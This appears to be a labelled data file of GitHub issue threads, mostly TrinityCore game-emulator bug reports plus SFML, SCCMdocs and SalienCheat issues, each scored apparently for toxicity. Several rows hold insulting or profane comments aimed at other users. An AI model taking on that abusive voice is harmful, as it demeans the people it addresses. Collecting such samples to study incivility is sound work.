MicrosoftDocs/SCCMdocs/1249,0.230940974,MicrosoftDocs,SCCMdocs,WTF,1255,10,24,0,0,"I search ""sccm create static computer collection"", knowing that a device collection is a list of computers that is dynamically generated but I want to make a static list that does not automatically change. Result Microsoft.com -&gt; ""How to Create a Static Collection""   &lt;- Promising blah blah blah VBScript or C# code it yourself. ........what?! SCCM is painful enough with absolutely no logic in how it is designed or functions.  Why does the Documentation have to suck even worse then the product!?  Document Details ⚠ Do not edit this section. It is required for docs.microsoft.com ➟ GitHub issue linking.  ID 19ae23b9-9a79-ce32-522b-e59697716bb3 Version Independent ID 83637444-e3ce-6c02-3617-d22842fb95b6 Content Create a Static Collection - Configuration Manager Content Source sccm/develop/core/clients/collections/how-to-create-a-static-collection.md Product configuration-manager GitHub Login @friend Microsoft Alias aaroncz   The Microsoft Open Source Code of Conduct, which outlines the expectations for community interactions in and around docs.microsoft.com, is designed to help ""provide a welcoming and inspiring community for all."" The content of this issue appears to be out of sync with the code of conduct. Thank you for closing it. ",0,0,63,0.5,0.5,53,4,
SFML/SFML/1556,0.19045795,SFML,SFML,Wow,1599,9,3,0.55,0,"And you removed my issue now, wow, good! Do you know what ? I'll try to set my framework without SFML because I see SFML is not a serious projet.   The issue was closed with a corresponding reason. This did not prevent you from commenting on why you think it should have been re-opened. You did not provide any information that would help anybody else in resolving the problem, if it was even caused by SFML. You disregarded the very text in the issue template that suggested asking on the forum first about any issues with the usage of SFML before opening an issue, which we prefer only contain confirmed bugs with appropriate information. The issue was not removed. Please familiarize yourself with the way GitHub works before making such claims. Threatening people in any way is not constructive and will not benefit anyone in any way. You are entitled to believe what you want to believe, but making blanket statements such as ""SFML is not a serious project"" on an open platform has a high chance to mislead people into believing it as a fact. As such, in the future please refrain from making such remarks. I have temporarily blocked you from the SFML organization for 7 days. Please take this time to calm down and reflect on what has just happened. If you have any comments regarding the handling of this issue, please either take it to the forum or contact the SFML team via other means. If, after you are unblocked, you intend to continue to post clearly non-constructive content, you will be permanently blocked from the SFML organization. This is your last warning.  Have a pleasant day. ",5,0,33,0.1,0.3,53,2,
SteamDatabase/SalienCheat/156,0.10237355000000001,SteamDatabase,SalienCheat,Not being able to only choose zones on a specific planet ,1059,11,0,0.6666666666666666,0,"why cant i set it to only choose zones from planet 18 or 19 so if i want a game only from planet 18 it will only use planet 18  Because you cannot do that.  @friend Why you can when do that in the game  i just want it so it only does planet 18  Because this is a bot that maximizes the XP you get. If you want to go manually to Planet 18 then you gotta turn off the bot and do it manually.  is there any fork of this project that allow me to do that @friend  I really want to do it on planet 18 and another planet when it comes i like does the whole script need to be rewritten to just use another planet ????  @friend can anybody do that please i really only want a game from planet 22 only can do i just change some lines of code and make it only use planet 22  why @friend  @friend already said why, stop asking.  BUT CANT YOU JUST CHANGE BESTPLANET IN THE CODE AND SET IT TO PLANET 22 @friend  Good job, then what do you want from us? Stop mentioning me.  @friend my only question is what i need to change it too for planet 22 !  Easy Write your own bot. ",5,0,21,0,0.3333333333333333,67,6,
TrinityCore/TrinityCore/10510,0.11098393,TrinityCore,TrinityCore,[DB/SAI] Mystery of the Infinite (12470),4987,61,50,0,2,"The quest itself might work, but it is still not finished. 1 text fails to execute, even when forced by an in-game data set command.  The end data set text also doesn't execute, nor do the actions.  Mirror aura is lost on Future You's evade mode; the core is only set to allow a vehicle aura on evade, anything else will be wiped out, including the clone aura. I don't have much time to finish those things, so you can test it out if you want, and add suggestions.  Creature entry 27898 has EventAI scripts, but its AIName is not 'EventAI' - possible AI-mismatch? Creature entry 27900 has EventAI scripts, but its AIName is not 'EventAI' - possible AI-mismatch?  Nothing in my DB's, but if there really are any EAI's  Yup, there are!  Also first creature_text should be ""'Hey there,""  No, it's ""Hei there..."" that's sniff info. And it's also ""Future you"" an npc that is your clone from the future, which in terms explains why the text is ""Hei"", it's something usually a player would say.  Would be best to change it though, ""Hei"" does sound rather strange.  ""Future You whispers Hey there, &lt;name&gt;, don't be alarmed. It's me... you... from the future. I'm here to help.""  Now go for the redux part - Mystery of the Infinite, Redux plus one  Oh and look here  at 720p  I already changed it to ""Hey"", but I still have no idea why the sniff would show a ""Hei"", unless it was tampered by mistake. I'm not going to do redux until this one is finished.  Great work Kirk!... as always. I would like to state that the quest is fully completable now, but there are a few cosmetic bugs with it. Just a few notes, I apologize if you already know this.  First creature_text   Does not appear to me.  Future You's character model disappears after he whispers you. ""I can't believe I used to wear that"". You can still target him by typing /tar future, but his character model is gone. Although mobs still will attack him while he's invisible!  He does not talk to you after saying ""I can't believe I used to wear that."" I don't appreciate his sassy attitude very much. xD  Weapons do not appear on Future You. He fist punches everything.  Future You has a 'PvP' flag, I could be wrong, but I don't think he's supposed to be flagged for PvP.  Nozdormu does not appear after the quest is finished.   Keep up the good work!  The quest itself might work, but it is still not finished. 1 text fails to execute, even when forced by an in-game data set command. &lt;&lt;&lt;&lt;  Ok forget, this was nothing to do...  Updated the above post with new changes, every aforementioned issue should now be fixed; This including, the text that didn't show, the fail quest if the hourglass is destroyed, the despawn set when the quest is finished. The only real issue that remains (And this is core sided) is that all auras save for one excluded are wiped form the npc on evade, we must find a circumvention for this aura or simply add it as an exclusion in the core also. Currenty @friend is working on this, and will keep you posted. Test out the updated script, and tell me if there are issues. And also note, if the Future You npc ends combat it will evade and lose it's clone aura, this will automatically make the script not work for him anymore, and he won't execute any text lines, or any lines for that matter; keep him in combat to test the script at all times.  Quest does not complete now, even when Future You stays in combat the entire event. Future You's weapons are still not shown. Nozdormu still does not appear, but that probably won't be fixed until and update is released to keep Future You from disappearing out of combat. As the last two lines of creature_text are not displayed. Otherwise that, all creature_text is now working as long as Future You stays in combat.  Did you try cleaning client cache?  Uhm, the quest should complete just fine; Also, Nozdormu only appears if the quest status is completed, because that aura is in spell_area. The last two lines should also appear, no idea why they don't for you. Did you try copying the new script up there? It is updated.  Gah, such a stupid mistake. Thank you Chazy, I will be going to bed now. Quest now completes as long as Future You stays in combat. Nozdormu does appear at the end now along with the two creature_text lines. Weapons are still not displayed on Future You.  That's a minor cosmetic bug, I can't deal with it now; what I really want done is to prevent the clone aura being removed. I'm glad everything else is fine now. Also, for me, a weapon and a shield appear on Future You, but not the ones I own, rather totally different ones.  Okay, aura issue fixed in faa2ec9 Please compile with that commit and re-try the quest now. Only thing left to fix now is getting the clone to not bounce off data sets. If he doesn't receive them, he won't execute script.  @friend  Sorry but i have a question to your commit. You set smart_ai for 27896 (NPC_AI) and 27897(NPC_ID) but you dont insert a smart_script for this id's. ",26,0,236,0,0,158,8,
TrinityCore/TrinityCore/11476,0.065910365,TrinityCore,TrinityCore,Quest NPC Missing Quest 3.3.5,9799,139,242,0,2,"Magistrix Landra Dawnstrider is missing the quest 9395 (Saltheril's Haven) WoWHead.com info say     Level 9     Requires level 8     Side Horde     Start Magistrix Landra Dawnstrider     End Lord Saltheril     Sharable     Difficulty 8  12  15     Added in patch 4.0.1 &lt; This is incorrect as it was added way before 4.0.1 I know because I played official since Vanilla and I made many Blood Elves even in WotLK 3.3.5. using Zygor Quest Guide takes you to her to accept quest but quest is not in log. Zygor Quest Guide follows the Vanilla Questing to a tee and I made sure I had the 3.3.5 Version of the quests guides so no mishaps like this happen Series  Saltheril's Haven The Party Never Ends  Checking in the Database (creature_queststarter) page 4 the quest id 9395 is linked with the correct quest entity 16210 (Magistrix Landra Dawnstrider) so why would the quest not populate and show up in-game? Level requirements were met faction requirements also met and the pre-quest 9255 (Research Notes) was completed which should make quest 9395 Available immediately. manually adding the quest does properly accept the quest. .quest add 9395  It may be in the disables table, if a manual add isn't working for it.  no manually adding it does work which is what confuses me on why it's not available when the appropriate requirements are met  Ok. Then it's simply not in creature_queststarter table. With the manual add, can it be properly handed-in? If not, then you need to add the appropriate creature_questender table entry, too.  it is in that table ""Checking in the Database (creature_queststarter) page 4 the quest id 9395 is linked with the correct quest entity 16210 (Magistrix Landra Dawnstrider) "" and yes it can be handed in correctly which is why I'm baffled by this. and prequest 9255 is properly linked in both tables  Check the quest_template table and verify the RequiredRaces column.  says 650 is that correct I forget where to check that it's available to all HORDE not just bloodelves.  Look for wrong conditions.  untaught how do i do that?    Have no time right now but when I get back I'll look at the issue.  650 is wrong. It should be 690 for WotLK or before and 946 for Cata and later (added goblin in Cata).  OK thanks untaught, i'll check that section now Kylroi and post if that fixes it  No conditions for that quest. It must be the RequiredRaces column set wrong.  yes the required race is 690 I guess I miss read it when I thought  9067    2   9   7   0   3430    0   0   0   0   690 0   0   0   0   0   0   0   0   0   0   9395    0   0   0   5   900 480 0   0   0   0   0   0   0   0   0   136 0   0   0   0   0   23500   0   0   0   1   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   911 0   0   0   0   5   0   0   0   0   0   0   0   0   0   0   0   0   0   The Party Never Ends    Acquire a bottle of Suntouched Special Reserve, Springpaw Appetizers and a Bundle of Fireworks, and return them to Lord Saltheril at Saltheril's Haven in Eversong Woods.   I like to throw parties... just a little something to celebrate the magnificence that is Quel'Thalas!$B$BBut, I'm in a bit of a bind.  I need you to gather up more party supplies.$B$BFrom Vinemaster Suntouched at the Silvermoon City inn, bring me a bottle of Suntouched Special Reserve.  From Zalene Firstlight at Farstrider Retreat acquire more of those delicious Springpaw Appetizers.  And you can pick up my delivery of fireworks from Halis Dawnstrider at Fairbreeze Village.$B$BBe quick about it!        You're quite the energetic young $gmanwoman;, aren't you?$B$BThis all looks very adequate. You certainly deserve compensation for gathering up all of this for me, and something a little extra I think.$B$BOh, I almost forgot, here's an invitation to the party. And, $c, next time that you drop in make sure to dress up in something a little more... festive.   Didn't I just send you out to gather up more party supplies?  Was that you?  Oh, I can't be expected to remember everyone's face, now can I?  I meet so many... interesting people.$B$BWhat is it that you want?    Return to Lord Saltheril at Saltheril's Haven in Eversong Woods.    0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   22775   22776   22777   0   0   0   1   1   1   0   0   0   1                   0   0   0   0   0   0   0   0   0   1   0   0   0   0   0   0   0   0   12340  that's a big mess ugh lol  Indeed. Is that the quest_template? If so, they really changed that structure between 3.3.5a and 4.3.4.  Here's the 4.3.4 listing  yes that's the quest template for the issue quest  So, 9067 lists 9395 as the next quest, and 9395 lists 9067 as the previous quest. However, the core doesn't give you 9395 when you complete 9067?  exactly and the level requirement is level 8 min and I was level 10 and still was not available... it's a odd bug probably something very minute could even be on my end but for the love I just cannot figure it out.  Well, yes, it's your end. You're using WoW emulation instead of a retail server. heh Seriously, though, it's sounding like a bug that was introduced in some of the code changes that have been going on. All I know it that when they try to merge some of those master branch changes, they royally mess up the 4.3.4 branch (current commit revision won't even compile all the way due to an incomplete merge, but that will likely be fixed in a day or so).  Could you post the SQL export of the 2 quests (similar to the way I posted the 4.3.4 version)? Which SQL client do you use?  i use navicat for windows to browse the database but for uploaded all the sql files i used ""mysql -u username -p  DATA-BASE-NAME &lt; data.sql "" from my linux console. I know everyone says ""don't use navicat"" but i've never had problems with it since mango's or trinity when i have done it locally but I didn't bother importing the dump's over the net like i said i used that bash command to upload them via linux directly &lt;code&gt; 9067;2;9;7;0;3430;0;0;0;0;690;0;0;0;0;0;0;0;0;0;0;9395;0;0;0;5;900;480;0;0;0;0;0;0;0;0;0;136;0;0;0;0;0;23500;0;0;0;1;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;911;0;0;0;0;5;0;0;0;0;0;0;0;0;0;0;0;0;0;The Party Never Ends;Acquire a bottle of Suntouched Special Reserve, Springpaw Appetizers and a Bundle of Fireworks, and return them to Lord Saltheril at Saltheril's Haven in Eversong Woods.;I like to throw parties... just a little something to celebrate the magnificence that is Quel'Thalas!$B$BBut, I'm in a bit of a bind.  I need you to gather up more party supplies.$B$BFrom Vinemaster Suntouched at the Silvermoon City inn, bring me a bottle of Suntouched Special Reserve.  From Zalene Firstlight at Farstrider Retreat acquire more of those delicious Springpaw Appetizers.  And you can pick up my delivery of fireworks from Halis Dawnstrider at Fairbreeze Village.$B$BBe quick about it!;;You're quite the energetic young $gmanwoman;, aren't you?$B$BThis all looks very adequate. You certainly deserve compensation for gathering up all of this for me, and something a little extra I think.$B$BOh, I almost forgot, here's an invitation to the party. And, $c, next time that you drop in make sure to dress up in something a little more... festive.;Didn't I just send you out to gather up more party supplies?  Was that you?  Oh, I can't be expected to remember everyone's face, now can I?  I meet so many... interesting people.$B$BWhat is it that you want?;Return to Lord Saltheril at Saltheril's Haven in Eversong Woods.;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;22775;22776;22777;0;0;0;1;1;1;0;0;0;1;;;;;0;0;0;0;0;0;0;0;0;1;0;0;0;0;0;0;0;0;12340 &lt;code&gt; 9395;2;9;8;0;3430;0;0;0;0;690;0;0;0;0;0;0;0;0;0;0;9255;0;0;9067;1;0;60;0;0;0;0;0;0;0;0;0;136;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;911;0;0;0;0;1;0;0;0;0;0;0;0;0;0;0;0;0;0;Saltheril's Haven;Speak with Lord Saltheril at Saltheril's Haven in Eversong Woods.;I swear that I'm going to fireball someone if I get one more request from Lord Saltheril concerning supplies for his party!  Do I look like a party planner?!  Between you and me, that fool and his sycophants are living in denial that we're under attack here!$B$BSome of us are actually busy with, oh, I don't know, defending what's left of Quel'Thalas!  $C, would you please head over to Saltheril's Haven and see if you can shut him up?  It's just down the road to the west.;;Ah, good of Magistrix Dawnstrider to finally respond to my simple requests.  I should take up the matter of her attitude with the regent lord in Silvermoon. She's quite rude!$B$BNothing for you to concern yourself with though. Now that you're here, maybe I'll finally be able to get those party supplies that I've been waiting for? ;;;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;1;;;;;0;0;0;0;0;0;0;0;0;1;0;0;0;0;0;0;0;0;12340  Quest 2 is the one that does not trigger after quest 1 is complete with all requirements met but quest 3 does trigger when manually adding quest 2  Research Notes is quest 1 yes  Interestingly, that isn't listed as part of the chain, not on Wowhead or in the 4.3.4 database. I wonder if that's the error going on.  I can no longer trust wow head because wowhead is claiming this quest only existed since 4.0.1 but this quest is from the launch of BC as part of the blood elf starter quests. but it could be the issue  For future reference, you can use something like  to get an SQL output. There may be other options to add, to strip out the unnecessary information, or just manually copy/paste the appropriate parts of the output.  oh yeah? thanks yeah I'm not very fluent in mysql query building  Everything works fine and the first quest in the chain is  !!!  hmm i'll try again i'll make a new character and start it all over again  I did forget to post my build though TrinityCore rev. 939a25346b57 TDB 335.52 ",29,0,618,0,0,356,33,
TrinityCore/TrinityCore/1225,0.0642209915,TrinityCore,TrinityCore,Summary  Buff- and Aura-Stacking,3549,15,10,0,12,"'''Armor''' Provided by Paladin (Devotion Aura), Shaman (Stoneskin Totem) ''Stacks'' '''5% Melee Critical Strike Chance''' Provided by Warrior (Rampage), Druid (Leader of the Pack) ''Stacks'' '''5% Spell Critical Strike Chance''' Provided by Druid (Moonkin Form), Shaman (Elemental Oath) ''Stack partially (but only for the Moonkin, who provides the aura)'' '''10% Attack Power''' Provided by DK (Abomination's Might), Hunter (Trueshot Aura), Shaman (Unleashed Rage) ''Stack partially (the same thing like 5% Spell-Crit, if there are for example 2 Hunters, the one who activate Trueshot Aura later get's 20% Attack Power)'' '''Mp5''' Provided by Shaman (Mana Spring Totem), Paladin (Blessing of Wisdom) ''Stacks'' '''Spell Power''' Provided by Warlock (Demonic Pact), Shaman (Totem of Wrath), Shaman (Flametongue Totem) ''Stack partially (Demonic Pact and Totem of Wrath/Flametongue Totem stacks, Totem of Wrath and Flametongue Totem does not stack)'' '''Healthpoints''' Provided by Warrior (Commanding Shout), Warlock (Blood Pact) ''Stacks'' '''Stats Multiplier''' Provided by Paladin (Blessing of King), Paladin (Blessing of Sanctuary) ''Stacks''  '''3% Damage''' Provided by Paladin (Sanctified Retribution), Mage (Arcane Empowerement), Hunter (Ferocious Inspiration) ''Does not Stack as far as i know, but not 100% sure'' '''10% Physical Damage Incoming''' Provided by Shaman (Ancestral Healing), Priest (Inspiration) ''Not tested yet'' '''3% Damage Incoming''' Provided by Paladin (Blessing of Sanctuary), Priest (Renewed Hope), Warrior (Vigiliance) ''Not tested yet'' '''5% Spell Haste''' Provided by Shaman (Wrath of Air Totem), Druid (Improved Moonkin Form) ''Not tested yet'' The rest work as intended as far as i know. I hope i can test the untested things soon, so i can update them.  Author mark07 As you can read [ here], it's right that the armor bonus from Devotion Aura stacks with Stoneskin Totem.  Author kbinside half of things you write should stack.  Author tehacy Please check your your Informations before writting such shit! When you're the opinion that someone made a fault, prove or at least explain why its wrong like mark07 (btw thanks for this information), but with this attitude please go trolling somewhere else. 5%crit shouldnt stack (physical and spell) -&gt;  shouldnt stack -&gt;  shouldnt stack -&gt;  shouldnt stack -&gt;  Mulitplier shouldnt stack -&gt;  to explain it These two Buffs should both be able to stack on a Raidmember but because of the partially different buffs they offer, but the Strength and Stamina part shouldnt stack Spell Power shouldnt stack -&gt;  (only discribed, that Flametongue and Wrath shouldnt stack), but  you can read this Demonic Pact does not stack with an elemental Shaman's Totem of Wrath 3%! Haste (Not 5% - shame on me - wasnt focused enough) shouldnt stack -&gt;  Damage shouldnt stack -&gt;  Physical Damage Incoming shouldnt stack -&gt;  Damage Incoming shouldnt stack -&gt;  damage reduction from Blessing of Sanctuary, Renewed Hope and Vigilance does not stack. The buffs stack, because they have other effects - mana replenishment, threat transfer, etc. - but the 3% damage reduction buffs do not stack. It's this way for pretty much every buff buffs that do exactly the same thing as each other, tend not to stack. Exception Stoneskin totem &amp; devo aura."") So the same thing as Blessing of Sanctuary and Kings. The Armor-Buff was my fault. I didnt checked it and trusted a raidmember.  It would be very nice, if u get this aura stacking fixed.  Updated at  #7667 ",7,0,304,0,0,208,2,
TrinityCore/TrinityCore/14120,0.047293532,TrinityCore,TrinityCore,Pet Pathing & Pet LoS,2714,25,15,0,2,"I couldn't find any other issue regarding this. I suppose this is a well known issue/exploit but I'll explain it briefly  Any Pet which can be commanded to attack (ie any warlock pet, hunter pet, frost mage pet,... etc) will go through walls and solid gobjects, mainly doors, to attack its objective.  This offers exploit opportunities to players such as starting combat with locked bosses and avoid doing the whole instance (ie Ymiron at Utgarde Pinnacle). hash c5dac48436c8a00d40640af9aecaaa71d549135a Using mmaps.  Walls or doors ? Because doors are ingame gameobjects spawned at runtime, walls are already present in client files and handled by MMAPs  then it's a know old issue, mmaps don't take into account any dynamically spawned gameobject  well I just wanted to have it on an open issue ^^  it has been a known issue for 2 years at least and it's going to be like that for 2 more years too  It's not an attitude, it's the simple consequence of the limitations of recastnavigation. We already worked on this issue months ago, people before us tried too but no steps forward have been made (and I'm actually the only dev who fixed an issue in recast and got his PR accepted). You could study how recastnavigation works and see with your own eyes what l'm talking about.  If anyone would like to mess with recast, here's an idea  1 year passed, 1 left to go  Not high anymore, with the new boundaries system from Treeston you can't pull ingvar anymore.  2 years passed! ding!  @friend in IRC, you mentioned that there are 2 types of game objects  ""static game objects"" such as doors. They are created at exactly the same place each time they are spawned in the world. In other words, their location and geometry is known at build time. And then ""dynamic game objects"" which can be spawned on a new and unknown location each time they are loaded. Their location and geometry is only known at runtime.  The support of what I call ""dynamic game objects"" in the MMAPs would be a really cool feature. But is it even blizz-like? Are there cases where game objects are spawned at a new location on each game session? I don't think such feature is even possible considering the constraint of performance and memory space that TC has. If we were to only implement support of ""static"" game objects, it would be much simpler. Won't be easy game but I got my little idea on how to do it.  I think we can implement features as incremental iterations, so handling doors would be nice and it will help understand how recast and detour work. We can worry about dynamic gameobjects later.  @friend This is still an issue on  yes, mmaps, vmaps and all that stuff is enabled. not sure why it was closed as it never got fixed. ",14,3,80,0,0,50,5,
TrinityCore/TrinityCore/15489,0.11982583299999999,TrinityCore,TrinityCore,6x Hunter and Troll Sham Issues #59eff3fe,1983,18,4,0,3,"Level 1 hunter, cannot equip weapons Troll Shaman Quest Proving Pit  to the Darkspear Jailor and nothing happens, quest is no initiated in the pit therefore it cannot be completed.  This issue is not considered valid because of the following reasons  No proper commit hash (revision)  Please read  . Thanks.  TBD 602 Rev 59eff3f This bot is rediculous lol  don't post multiple issues on one ticket. search before posting tickets. (duplicate)  @friend ; the bot is not ridiculous, it points out that the first post of your issue is not properly written. If you don't follow the TC guidelines on how to post an issue, this is one of the consequences.  its closed with Aokromes making his usual attitude and I am holier than though apprach, let it be that way. TC has been rushed and devs dont give a shit about us trying to learn  Well, that is what I used to feel myself, especially regarding my own issues when posting a year ago. Seeing his comment today, from an outsider's viewpoint, his comment is neutral, short and to the point.  well Ive searched for the issues that I have found on my 6x server, no answers no fixes, nothing yet I get told to search or go to this thread or that thread and yep, already been there and nope it doesnt fix a thing. How about they just own up to the fact that a start area is bugged or a a class is bugged and fix it rather than trolling forums or github trashing the novices. Tis the trouble with online communites, those who think that they are god and those who genuinely want to learn. I will wait patiently until 6x gets a lot more mature before I even try to play with it again.  Your issues (2 issues) in the first post are duplicates. Example search  issues you can follow to see the progression on issue fixes [Quest] Proving Pit #11706  Fixed equip ranged weapons (Guns, throwns etc..) #14493  Hunter bug 6.x #15296  ok finally got it so hunters can equip, wondering why it doesnt give the hunter a cross bow or  a bow on initial load ",5,0,52,0,0,42,0,
TrinityCore/TrinityCore/16280,0.4729200525,TrinityCore,TrinityCore,[3.3.5] Trial of The Crusader - Event Problem,1221,9,9,0,1,"Branch  3.3.5 Commit  0316dff24530da83ef3466500ee8bd4e1af548ba When you are enter on trial of the crusader then start the event .  gormok the impaler comes inside the ring and stay ... nothing happened and he is not selectable and doesn't moving kill him with die and the snakes are same .  Dreadscale come in and the other one does not come up from the ground . before this i'm on  347373264b4ca5046af5c23378117e6ddb66504d  and everything works fine .  linking these to reference what you are talking about with the disables.  @friend   it's already disabled in db , i'v encountered another issue with new commits .  Like I said, I was just referencing what you were talking about.  Very likely bug on boundaries commit.  Started with 2da458c56d024aac04468ce2af454a83ad790bf6 Tested with the previous commit and all ok.  @friend since when exactly does Sindragosa have anything to do with Trial of The Crusader?  @friend realy stupid?This problem is boundaries system.  @friend it would be great if you could speak/write in a slightly more moderate tone. Those phrases you use aren't really appropriate for an issue tracker. I'm not sure how many people are willing to help you with such an attitude. Just my 2 cents... ",2,0,36,0,0,18,2,
TrinityCore/TrinityCore/17506,0.6410379900000001,TrinityCore,TrinityCore,[6.x] Encounter Progress Panel,6874,59,28,0,0,"Description Hello TrinityCore devs. I have noticed that the boss encounter progress panel is not working. I know this is only a cosmetic thing; and TC is appearing to be focused on playability. But many of us are here to study and to learn about how, maybe, a real MMO will be structured back-end. It is nice that a spell works, but it doesn't help with the model of TrinityCore (an educational project). I would really love to learn more from you about this system. Current behaviour Tell us what happens When you enter a dungeon from the instance portal, you do not see the encounter progress panel on the right of the screen. Expected behaviour Tell us what should happen instead On retail, when entering the instance, we will see something like this  Steps to reproduce the problem  Make any character Teleport to the entrance of any dungeon Enter the dungeon  Branch(es) 3.3.5 / 6.x (Select the branch(es) affected by this issue)  6.x TC hash/commit 77f980035a43a9156c22130042d1fb6597139ee0 TDB version 6.04 Operating system Windows 10  I am sure this ticket is duplicate, but can't find original one.  I did search for an open ticket too, but did not find one so I created this.  NO! PLEASE CLOSE! why tc should doing that while all pservers already having this? for make difficulty with merge? better for work on quests and spells which not pservers having. for improving state of private conditions source.  @friend well this is not only a cosmetic. This makes players to get more bonuses like Experience and Gold.. Thats a huge thing to get fixed  )  @friend TC has no business with private servers so if TC implements scenarios on their own they don't have to care about their servers. (Scenarios is the point that is being asked for here.)  Wall of text warning I'm working on implementing Scenarios for TrinityCore at the moment, but have been asked to put it on hold for a while, while I spend some time to update and push some uncommited PvE encounter scripts for Dragon Soul / Terrace of Endless Spring and Heart of Fear. Main issue with the scenario system I'm currently working on is the missing information about Criteria Tree operator flags which the scenario system, and achievement system build upon. Basically the operator flags help determine whether or not a criteria has been fulfilled (which Scenarios use to track progress). We currently only know 2 operator flags for processing criteria progresses, and there appears to be at least 2 more that are currently unknown. Basically what doesn't work is if the scenario asks you to kill 30 creatures in the instance, then the criterias behind it might look something like this Description Kill 30 enemies (CriteriaTreeId 123) Amount to complete criteria is determined from the CriteriaTreeId, and that amount is 30 (30 enemies) CriteriaIds to be fullfilled to complete CriteriaTreeId 123 are the following 50,  51, 52. Criteria 50 corresponds to killing creature with entry 1001, 15 times. Criteria 51 corresponds to killing creature with entry 1002, 15 times. Criteria 52 corresponds to killing creature with entry 1005, 15 times. The currently criteria system will then only fulfill the criteriatree, if all criterias are complete. And they  currently  require you to kill exactly 15 of creature entry 1001, 15 of creature entry 1002, and 15 of creature entry 1005. Which is a total of 45, and a strict requirement to kill 15 of a certain creature, when the CriteriaTree asked for 30, from any of those criterias listed. This is the behavior that I've observed so far, but I could use some help from Shauren to verify this and see if he has any idea of what the currently unknown operator flags might do. There's also another problem with the criteria UI, and I believe it's related to a loading screen issue currently present in TrinityCore. When you get a loading screen, you bar will fill up to indicate loading progress, just like retail. However when it reaches 100% on trinitycore, the loading bar disappears after a small delay, without removing the loading screen itself. The loading screen eventually goes away but it has already caused an impact in displaying the scenario UI, whos opcode has been sent properly. Resending the scenario UI opcode whilst playing will correctly show the UI. These 2 problems are currently impeding the progress of pushing this feature, so if you have any knowledge about helping/fixing this, please contact me. The 2 issues recapped  Unknown CriteriaTree.db2 operator flags TrinityCore Loading screen issue (I might be very wrong about this being the root cause for the scenario UI not showing, if sent during the loading screen)   So I was wrong, this is more than a cosmetic issue. I am now even more intrigued about this Scenario system. Maybe you can push a PR to TC and the community can improve / complete the system? I'm very interested to look at your work.  @friend Loading screens should have been fixed 3 weeks ago - 2fe6fc63d79655a96ee2135a6b380ce353729088  @friend Great! Sorry for refering to outdated rev.  @friend better to not make pr. why to do pr of scinario to tc? all pserver have already this. only to making merge conflict? for making battle with git?! open sources dose not need it! do the encounter script, the ""Dragon Soul / Terrace of Endless Spring and Heart of Fear"" is lot better for you. pls. many respect to tc devs, but pls close issue.  @friend please kindly fuck off and mind your own server with this attitude. While at it please also don't use TrinityCore as you clearly already have everything fixed, don't need anything here except just leeching things you are unable to fix yourself.  @friend you know a simple thank you goes a long way? It shows you are nothing more than a Leech! Who the ---- do you think you are dictating what and what the opensource needs? As for your request to get something done... How about placing a bounty on it so the person who caters to you actually gains something for providing you what you want since you cant provide fixes. If you are running a pserver which mind you is NOT supported by TC or any other core development community this means you are gaining from it in some way or you would not be doing it how about throwing the dev team a Monitory tip for their efforts. Clearly you are too incompetent. Or hey wait even better.. Learn to code and move away from TrinityCore. WAIT A F--ken moment here So you have that working and yet you didn't provide a solution or p/r? You have no one to blame but yourself for merge conflicts because you didn't offer a p/r  Here's your tissue mate. I Second Shauren in his statement. @friend Nice response! I could not say it any better )  @ Trinity Development Team and Community You guys rock and Don't let people like this discourage you. People like ViktorIvanenko Hold very little value and only acts for their own gain not anyone else. ",18,0,184,0,0,200,16,
TrinityCore/TrinityCore/19440,0.0733263225,TrinityCore,TrinityCore,"[3.3.5] Spell Reflect vs Channel Spells, multiple reflections",2016,13,9,0,2,"Description Spell Reflect is reflecting multiple ""ticks"" of channel spells like Arcane Missiles spell 42846 = [Arcane Missiles] spell 23920 = [Spell Reflection] Expected behaviour Spell Reflect should reflect the first ""tick"" only Steps to reproduce the problem  Put a mage and warrior in duel With talent  [Missile Barrage] (spellid=44401) active, use Arcane Missiles in a warrior with Spell Reflect active You should receive back 2 Missiles, instead 1  Is more easy reproduce if mage has a good hast rating Branch(es) 3.3.5 TC rev. hash/commit  21b2042840e05ebeba365c54d47c07c13fde123f  i dont think so, before your spells rework, all missiles hit warrior and 0 was reflected xd  Is improved spell reflection speced during this?  Imp. spell reflection only affects party members   three first waves of arcane missiles will get reflected, and the next ones you will have to take. the drain life cast will just simply cancel, and he will have to use another global cooldown to cast it again. the drain soul cast will simply cancel, and he will have to use another global cooldown to cast it again. the mind flay cast will simply cancel, and he will have to use another global cooldown to cast it again.   Bad issue tagged in commit  @friend you said Expected behaviour Spell Reflection should reflect the first ""tick"" only Don't be stupid, @friend Spell Reflection should reflect all of the missiles. Have you even even researched this?  No need to insult other users, if you think something is wrong just state it.  Maybe if he researched it, I wouldn't have insulted him.  Ok, bad attitude even warned, next time you will be blocked.   Btw, i will try some friend to check it on retail, i'm pretty sure it only should reflect the first ""tick"" I remember when i'm doing arena close to pre patch (wotlk-&gt;cata) and in middle of MOP my penance reflect only first tick. With more time i will search more videos too )  yeah i cant find videos to to sustain my point... So updated issue description. Thanks lineagedr. ",17,1,69,0,0,49,2,
TrinityCore/TrinityCore/20683,0.13774121,TrinityCore,TrinityCore,DB/SAI: Initiate Emeline and Initiate Colin,194,1,3,0,0,Description Initiate Emeline and Initiate Colin should talk every once in a while. Branch(es) both. TC rev. hash/commit 7dc97c035350f9505a9fba0b8ec2d2037044e586 TDB version 335.63 Suggested fix ,1,0,7,0,0,12,0,
